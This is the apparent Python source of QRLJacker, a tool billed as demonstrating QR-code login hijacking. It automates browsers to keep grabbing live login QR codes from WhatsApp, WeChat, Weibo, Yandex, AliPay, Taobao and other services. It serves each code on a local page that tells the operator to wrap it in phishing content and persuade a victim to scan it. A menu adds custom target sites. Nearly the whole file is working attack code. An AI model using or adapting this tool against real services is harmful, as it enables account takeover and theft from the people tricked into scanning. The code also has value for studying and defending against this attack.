#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#Author: @D4Vinci
import base64 ,time ,os ,urllib ,sys ,threading
from binascii import a2b_base64

def clear():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")

try:
	from PIL import Image
	import selenium, requests, configparser
	from selenium import webdriver

except:
	print "[*] Error Importing Exterinal Libraries"
	print "[*] Trying install it using the requirements.txt file..\n"
	try:
		os.system("pip install -r requirements.txt")
	except:
		try:
			#if python not in the path (In windows case)
			os.system(str(sys.executable)+" -m pip install -r requirements.txt")
		except:
			print "[*] Failed installing the requirements [ Install it yourself :p ]"
		exit()

finally:
	from PIL import Image
	import selenium
	from selenium import webdriver

settings = configparser.ConfigParser()

def Serve_it(port=1337):
	def serve(port):
		if os.name=="nt":
			try:
				print " [*] Starting victim session on http://localhost:"+str(port)
				os.system("python -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")
			except:
				print " [*] Starting victim session on http://localhost:"+str(port)
				#if python not in the path (In windows case)
				os.system(str(sys.executable)+" -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")
		else:
			print " [*] Starting victim session on http://localhost:"+str(port)
			os.system("python -m SimpleHTTPServer "+str(port)+" > /dev/null 2>&1")
	threading.Thread(target=serve,args=(port,)).start()

def create_driver():
	try:
		web = webdriver.Firefox()
		print " [*] Opening Mozila FireFox..."
		return web
	except:
		try:
			web = webdriver.Chrome()
			print " [*] We got some errors running Firefox, Opening Google Chrome instead..."
			return web
		except:
			try:
				web = webdriver.Opera()
				print " [*] We got some errors running Chrome, Opening Opera instead..."
				return web
			except:
				try:
					web = webdriver.Edge()
					print " [*] We got some errors running Opera, Opening Edge instead..."
					return web
				except:
					try:
						web = webdriver.Ie()
						print " [*] We got some errors running Edge, Opening Internet Explorer instead..."
						return web
					except:
						print " Error: \n Can not call any WebBrowsers\n  Check your Installed Browsers!"
						exit()

#Stolen from stackoverflow :D
def Screenshot(PicName ,location ,size):
	img = Image.open(PicName)#screenshot.png
	left = location['x']
	top = location['y']
	right = left + size['width']
	bottom = top + size['height']
	box = (int(left), int(top), int(right), int(bottom))
	final = img.crop(box) # defines crop points
	final.load()
	final.save(PicName)

def whatsapp():
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get('https://web.whatsapp.com/')
		time.sleep(5)
	except:
		print " [!] Error Check your internet connection"
		time.sleep(5)
		return

	while True:
		try:
			button = driver.find_element_by_class_name('qr-button')
			print " [*] Idle detected, Reloading QR code image (Good job WhatsApp)..."
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass

		try:
			img = driver.find_elements_by_tag_name('img')[0]
			src = img.get_attribute('src').replace("data:image/png;base64,","")
			print " [*] QR code image detected !"
			print " [*] Downloading the image..."
			binary_data = a2b_base64(src)
			qr = open("tmp.png","wb")
			qr.write(binary_data)
			print " [*] Saved To tmp.png"
			qr.close()
			time.sleep(5)
			continue
		except:
			break

#make("svg")
def Yandex():
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get("https://passport.yandex.com/auth?mode=qr")
		time.sleep(5)
	except:
		print " [!] Error Check your internet connection"
		time.sleep(5)
		return

	while True:
		try:
			img_url = "https://passport.yandex.com" + driver.find_element_by_class_name("qr-code__i").get_attribute("style").split("\"")[1].encode("utf-8")
			print " [*] QR code image detected !"
			data = urllib.urlopen(img_url).read()
			print " [*] Downloading the image.."
			f = open("tmp.svg","w").write(data)
			print " [*] Saved To tmp.svg"
			time.sleep(20)
			if "yandex.com" in driver.current_url.encode("utf-8"):
			    if "mode=qr" not in driver.current_url.encode("utf-8"):
					print " [*] Refreshing page..."
					try:
						driver.get("https://passport.yandex.com/auth?mode=qr")
						time.sleep(5)
					except:
						print " [!] Error Check your internet connection"
						time.sleep(5)
						return
			continue
		except:
			break

def Airdroid():
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get("http://web.airdroid.com")
		time.sleep(5)
	except:
		print " [!] Error Check your internet connection"
		time.sleep(5)
		return
	img_number = 16
	refresh = 0
	while True:

		try:
			button = driver.find_element_by_class_name("widget-login-refresh-qrcode")[0]
			print " [*] Clicking to reload QR code image..."
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[img_number]
			print " [*] QR code image detected !"
			src = img.get_attribute('src')
			print " [*] Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [*] Saved To tmp.png"
			time.sleep(10)
			if refresh == 0:
				print " [*] Refreshing page..."
				driver.refresh()
				refresh = 1
			img_number = 15
			continue
		except:
			break

def Weibo():
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get("http://weibo.com/login.php")
		time.sleep(5)
	except:
		print " [!] Error Check your internet connection"
		time.sleep(5)
		return
	while True:

		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[len(imgs)-1]
			print " [*] QR code image detected !"
			src = img.get_attribute('src')
			print " [*] Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [*] Saved To tmp.png"
			time.sleep(60)
			print " [*] Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def WeChat():
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get("https://web.wechat.com")
		time.sleep(5)
	except:
		print " [*] Error Check your internet connection"
		time.sleep(5)
		return
	while True:
		try:
			iclass = driver.find_element_by_class_name('qrcode')[0]
			img = iclass.find_elements_by_tag_name("img")[0]
			print " [*] QR code image detected !"
			src = img.get_attribute('src')
			print " [*] Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [*] Saved To tmp.png"
			time.sleep(10)
			continue
		except:
			break

def AliPay():
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get("https://auth.alipay.com/login/index.htm")
		time.sleep(5)
	except:
		print " [*] Error Check your internet connection"
		time.sleep(5)
		return
	while True:

		try:
			c = driver.find_elements_by_class_name('ui-nav')[0]
			button = c.find_elements_by_tag_name("li")[0]
			print " [*] Clicking to show QR code image..."
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass

		try:
			driver.save_screenshot('tmp.png') #screenshot entire page
			img = driver.find_elements_by_tag_name("canvas")[0]
			print " [*] QR code image detected !"
			location = img.location
			size = img.size
			print " [*] Grabbing photo.."
			Screenshot("tmp.png" ,location ,size)
			print " [*] Saved To tmp.png"
			time.sleep(60)
			print " [*] Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Taobao():
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get("https://login.taobao.com")
		time.sleep(5)
	except:
		print " [*] Error Check your internet connection"
		time.sleep(5)
		return
	while True:

		try:
			button_class = driver.find_element_by_class_name("msg-err")
			button = button_class.find_elements_by_tag_name("a")[0]
			print " [*] Clicking to reload QR code image..."
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print " [*] QR code image detected !"
			src = img.get_attribute('src')
			print " [*] Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [*] Saved To tmp.png"
			time.sleep(10)
			continue
		except:
			break

def mydigipass():
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get("https://www.mydigipass.com/en/fp/signin/smartphone/qr")
		time.sleep(5)
	except:
		print " [!] Error Check your internet connection"
		time.sleep(5)
		return
	while True:

		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[1]
			print " [*] QR code image detected !"
			src = img.get_attribute('src')
			print " [*] Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [*] Saved To tmp.png"
			time.sleep(20)
			print " [*] Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Zapper():
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get("https://www.zapper.com/login.php")
		time.sleep(5)
	except:
		print " [!] Error Check your internet connection"
		time.sleep(5)
		return
	while True:
		try:
			img = driver.find_elements_by_tag_name("img")[3]
			print " [*] QR code image detected !"
			src = img.get_attribute('src')
			print " [*] Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [*] Saved To tmp.png"
			time.sleep(20)
		except:
			break

def Trustly_App():
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get("https://trustlyapp.com/backend")
		time.sleep(5)
	except:
		print " [!] Error Check your internet connection"
		time.sleep(5)
		return
	while True:

		try:
			c = driver.find_elements_by_class_name("qrcode-tab")[0]
			img = c.find_elements_by_tag_name("img")[0]
			print " [*] QR code image detected !"
			src = img.get_attribute('src')
			print " [*] Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [*] Saved To tmp.png"
			time.sleep(60)
			continue
		except:
			break

def Yelophone():
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get("https://www.yelophone.com/app#/login")
		time.sleep(5)
	except:
		print " [!] Error Check your internet connection"
		time.sleep(5)
		return
	while True:

		try:
			c = driver.find_elements_by_id("qrcode")[0]
			print " [*] QR code image detected !"
			src = c.get_attribute("src")
			print " [*] Downloading the image.."
			qr = open("tmp.png","wb").write( requests.get( c.get_attribute("src") ).content )
			print " [*] Saved To tmp.png"
			time.sleep(60)
			continue
		except:
			break

def make( service_name , port , type="html" ):
	if type == "html":
		code = """<html>
<head>
<title>"""+str(service_name)+"""</title>
</head>
<body>
<script>
var myTimer; myTimer = window.setInterval(reloadD,3000);
function reloadD(){ d = new Date(); document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();}
</script>
<center><h1><b>QRLJacker: """+str(service_name)+"""</b></h1>
Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
</br>1. This is your always updated """+str(service_name)+""" QR Code
</b><img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;">
</br>2. Edit Index.html by adding your phishing page source code, style, resources, etc.. ("Index.html" located in the framework folder)
</br>3. Point your victim to your phishing <a href='http://localhost:"""+str(port)+"""'>URL</a>, Convince to scan the QR code and Bob is your uncle!
</center>
</body>
</html>"""

	if type == "svg":
		code = """<html>
<head>
<title>"""+str(service_name)+"""</title>
</head>
<body>
<script>
var myTimer; myTimer = window.setInterval(reloadD,3000);
function reloadD(){ d = new Date(); document.getElementById('qrcodew').src="tmp.svg?h="+d.getTime();}
</script>
<center><h1><b>QRLJacker: """+str(service_name)+"""</b></h1>
Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
</br>1. This is your always updated """+str(service_name)+""" QR Code
</b><img id="qrcodew" alt="Scan me!" src="tmp.svg" style="display: block;">
</br>2. Edit Index.html by adding your phishing page source code, style, resources, etc.. ("Index.html" located in the framework folder)
</br>3. Point your victim to your phishing <a href='http://localhost:"""+str(port)+"""'>URL</a>, Convince to scan the QR code and Bob is your uncle!
</center>
</body>
</html>"""
	f = open("index.html","w")
	f.write(code)
	f.close()

def Add_website():
	print "  1.Find image by class and its number method"
	print "  2.Find image by its number only method"
	print "  3.Find image by the screenshot method"
	print "  00.Back To Main Menu"
	method = raw_input("\n  Note: Customization doesn\'t support svg images for now\n  Select method > ")
	if method == "00":
		main()

	elif int(method) == 1:
		classname = raw_input("   Classname > ")
		url = raw_input("   Url > ")
		image_number = int( raw_input("   Image Number > ") )
		Seconds = raw_input("   Refresh every (Default 10s) > ")
		try:
			int(Seconds)
		except:
			Seconds = 10
		port = raw_input("   Port to listen on (Default 1337) : ")
		try:
			int(port)
		except ValueError:
			port = 1337
		print " [*] Saving settings..."
		settings.read(os.path.join('Data', 'Custom.ini'))
		name = url.replace("http://","").replace("https://","").split("/")[0]
		settings.add_section(name)
		settings.set(name,"method","1")
		settings.set(name,"classname",classname)
		settings.set(name,"url",url)
		settings.set(name,"image_number",str(image_number))
		settings.set(name,"Seconds",str(Seconds))
		settings.write(open(os.path.join('Data', 'Custom.ini'),"wb"))
		clear()
		print " [*] Settings saved."
		print " [*] Running the exploit..."
		print "="*12
		make( name , port )
		Serve_it(port)
		First_Method(classname,url,image_number,Seconds)
		main()

	elif int(method) == 2:
		url = raw_input("   Url > ")
		image_number = int( raw_input("   Image Number > ") )
		Seconds = raw_input("   Refresh every (Default 10s) > ")
		try:
			int(Seconds)
		except:
			Seconds = 10
		port = raw_input("   Port to listen on (Default 1337) : ")
		try:
			int( port )
		except ValueError:
			port = 1337
		print " [*] Saving settings..."
		settings.read(os.path.join('Data', 'Custom.ini'))
		name = url.replace("http://","").replace("https://","").split("/")[0]
		settings.add_section(name)
		settings.set(name,"method","2")
		settings.set(name,"url",url)
		settings.set(name,"image_number",str(image_number))
		settings.set(name,"Seconds",str(Seconds))
		settings.write(open(os.path.join('Data', 'Custom.ini'),"wb"))
		clear()
		print " [*] Settings saved."
		print " [*] Running the exploit..."
		print "="*12
		make( name , port )
		Serve_it( port )
		Second_Method( url , image_number , Seconds )
		main()

	elif int(method) == 3:
		url = raw_input("   Url > ")
		image_number = int( raw_input("   Image Number (To get its width and location)> ") )
		Seconds = raw_input("   Refresh every (Default 10s) > ")
		try:
			int(Seconds)
		except:
			Seconds = 10
		port = raw_input("   Port to listen on (Default 1337) : ")
		try:
			int( port )
		except ValueError:
			port = 1337
		print " [*] Saving settings..."
		settings.read(os.path.join('Data', 'Custom.ini'))
		name = url.replace("http://","").replace("https://","").split("/")[0]
		settings.add_section(name)
		settings.set(name,"method","3")
		settings.set(name,"url",url)
		settings.set(name,"image_number",str(image_number))
		settings.set(name,"Seconds",str(Seconds))
		settings.write(open(os.path.join('Data', 'Custom.ini'),"wb"))
		clear()
		print " [*] Settings saved."
		print " [*] Running the exploit..."
		print "="*12
		make( name , port )
		Serve_it( port )
		Third_Method( url , image_number , Seconds )
		main()

	else:
		main()

def Use_website():
	settings.read(os.path.join('Data', 'Custom.ini'))
	print "\n"
	for n,w in enumerate(settings.sections()):
		print " "+str(n)+"."+w.encode("utf-8")
	print " 00.Back To Main Menu"
	website = raw_input("\n  Select website > ")
	websites = settings.sections()
	if website == "00":
		main()
	try:
		section = websites[int(website)]
	except:
		Use_website()

	method = int( settings.get(section,"method") )

	if int(method) == 1:
		classname = settings.get(section,"classname")
		url = settings.get(section,"url")
		image_number = settings.get(section,"image_number")
		Seconds = settings.get(section,"Seconds")
		First_Method(classname,url,image_number,Seconds)
		main()

	elif int(method) == 2:
		url = settings.get(section,"url")
		image_number = settings.get(section,"image_number")
		Seconds = settings.get(section,"Seconds")
		Second_Method(url,image_number,Seconds)
		main()

	elif int(method) == 3:
		url = settings.get(section,"url")
		image_number = settings.get(section,"image_number")
		Seconds = settings.get(section,"Seconds")
		Third_Method(url,image_number,Seconds)
		main()

	else:
		Use_website()

def Remove_website():
	settings.read(os.path.join('Data', 'Custom.ini'))
	print "\n"
	for n,w in enumerate(settings.sections()):
		print " "+str(n)+"."+w.encode("utf-8")
	print " 00.Back To Main Menu"
	website = raw_input("\n  Select website > ")
	websites = settings.sections()
	if website == "00":
		main()
	try:
		section = websites[int(website)]
	except:
		Remove_website()
	settings.remove_section(section)
	print " [*] Website removed."
	time.sleep(5)
	main()

def First_Method(classname,url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get(url)
		time.sleep(5)
	except:
		print " [!] Error Check your internet connection"
		time.sleep(5)
		return

	while True:

		try:
			login = driver.find_element_by_class_name(classname)
			img = login.find_elements_by_tag_name('img')[int(image_number)]
			print " [*] QR code image detected !"
			src = img.get_attribute('src')
			print " [*] Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [*] Saved To tmp.png"
			time.sleep(s)
			print " [*] Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Second_Method(url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get(url)
		time.sleep(5)
	except:
		print " [!] Error Check your internet connection"
		time.sleep(5)
		return
	while True:

		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[int(image_number)]
			print " [*] QR code image detected !"
			src = img.get_attribute('src')
			print " [*] Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [*] Saved To tmp.png"
			time.sleep(s)
			print " [*] Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Third_Method(url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
		driver.get(url)
		time.sleep(10)
	except:
		print " [!] Error Check your internet connection"
		time.sleep(5)
		return
	while True:

		try:
			driver.save_screenshot('tmp.png') #screenshot entire page
			img = driver.find_elements_by_tag_name("img")[int(image_number)]
			print " [*] QR code image detected !"
			location = img.location
			size = img.size
			print " [*] Grabbing photo.."
			Screenshot("tmp.png" ,location ,size)
			print " [*] Saved To tmp.png"
			time.sleep(s)
			print " [*] Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def main():
	clear()
	print """

   ____  _____  _          _            _
  / __ \|  __ \| |        | |          | |
 | |  | | |__) | |        | | __ _  ___| | _____ _ __
 | |  | |  _  /| |    _   | |/ _` |/ __| |/ / _ \ '__|
 | |__| | | \ \| |___| |__| | (_| | (__|   <  __/ |
  \___\_\_|  \_\______\____/ \__,_|\___|_|\_\___|_|

  #QRLJacker is a customizable framework to demonstrate "QRLJacking Attack Vector" and shows How easy to hijack services that relies on QR Code Authentication!
  #A Social Engineering Attack Vector by: Mohamed A. Baset (@SymbianSyMoh)
  #Coded by: Karim Shoair (@D4Vinci)

 Vulnerable Web Applications and Services:
  1.Chat Applications
  2.Mailing Services
  3.eCommerce
  4.Online Banking
  5.Passport Services
  6.Mobile Management Software
  7.Other Services
  8.Customization
  9.Exit
"""
	choice = raw_input(" Choice > ")
	if not choice.isdigit():
		main()
	else:
		choice = int(choice)
	#Chat Applications

	if choice == 9:
		exit()

	if choice == 1:
		print """
 1.WhatsApp
 2.WeChat
 3.Weibo
 00.Back To Main Menu
	"""

		choice_2 = raw_input("\n Second Choice > ")

		if choice_2 == "00":
			main()

		#Whatsapp
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Whatsapp" , port )
			Serve_it(port)
			whatsapp()
			main()

		#Wechat
		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "WeChat" , port )
			Serve_it(port)
			WeChat()
			main()

		#Weibo
		elif int(choice_2) == 3:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337
			clear()
			make( "Weibo" , port )
			Serve_it(port)
			Weibo()
			main()

		else:
			main()

	#Mailing Services
	if choice == 2:
		print """
 1.Yandex Mail
 00.Back To Main Menu
	"""
		choice_2 = raw_input("\n Second Choice > ")

		if choice_2 == "00":
			main()

		#Yandex Mail
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Yandex" , port , "svg")
			Serve_it(port)
			Yandex()
			main()

		else:
			main()

	#eCommerce
	if choice == 3:
		print """
 1.Taobao
 2.Taobao Trips
 00.Back To Main Menu
	"""
		choice_2 = raw_input("\n Second Choice > ")
		if choice_2 == "00":
			main()

		#Taobao
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Taobao" , port )
			Serve_it(port)
			Taobao()
			main()

		#Taobao Trips
		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Taobao Trips" , port )
			Serve_it(port)
			Taobao()
			main()

		else:
			main()

	#Online Banking
	if choice == 4:
		print """
 1.AliPay
 2.Yandex Money
 00.Back To Main Menu
	"""
		choice_2 = raw_input("\n Second Choice > ")
		if choice_2 == "00":
			main()

		#AliPay
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "AliPay" , port )
			Serve_it(port)
			AliPay()
			main()

		#Yandex Money
		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Yandex Money" , port , "svg")
			Serve_it(port)
			Yandex()
			main()

		else:
			main()

	#Passport Services
	if choice == 5:
		print """
 1.Yandex Passport
 00.Back To Main Menu
	"""
		choice_2 = raw_input("\n Second Choice > ")
		if choice_2 == "00":
			main()

		#Yandex Passport
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Yandex passport" , port , "svg")
			Serve_it(port)
			Yandex()
			main()

		else:
			main()

	#Mobile Management Software
	if choice == 6:
		print """
 1.Airdroid
 00.Back To Main Menu
	"""
		choice_2 = raw_input("\n Second Choice > ")

		if choice_2 == "00":
			main()

		#Airdroid
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Airdroid" , port )
			Serve_it(port)
			Airdroid()
			main()

		else:
			main()

	#Other Services
	if choice == 7:
		print """
 1.MyDigiPass
 2.Zapper
 3.Trustly App
 4.Yelophone
 00.Back To Main Menu
"""
		choice_2 = raw_input("\n Second Choice > ")
		if choice_2 == "00":
			main()

		#MyDigiPass
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "MyDigiPass" , port )
			Serve_it(port)
			mydigipass()
			main()

		#Zapper
		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Zapper" , port )
			Serve_it(port)
			Zapper()
			main()

		#Trustly App
		elif int(choice_2) == 3:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Trustly app" , port )
			Serve_it(port)
			Trustly_App()
			main()

		#Yelophone
		elif int(choice_2) == 4:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Yelophone" , port )
			Serve_it(port)
			Yelophone()
			main()

		else:
			main()

	#Customization
	if choice == 8:
		print " 1.Add a new website."
		print " 2.Use an existing website."
		print " 3.Remove an existing website."
		print " 00.Back To Main Menu"

		choice_2 = raw_input("\n Second Choice > ")
		if choice_2 == "00":
			main()

		elif int(choice_2) == 1:
			Add_website()

		elif int(choice_2) == 2:
			Use_website()

		elif int(choice_2) == 3:
			Remove_website()

		else:
			main()

		#settings.read(os.path.join('Data', 'Custom.ini'))
		#sections = settings.sections()
		#url = settings.get(section,"url")
		#settings.add_section(name)
		#settings.set(name,"url",url)
		#settings.write(open(os.path.join('Data', 'Custom.ini'),"wb"))

	else:
		main()

if __name__ == '__main__':
	main()
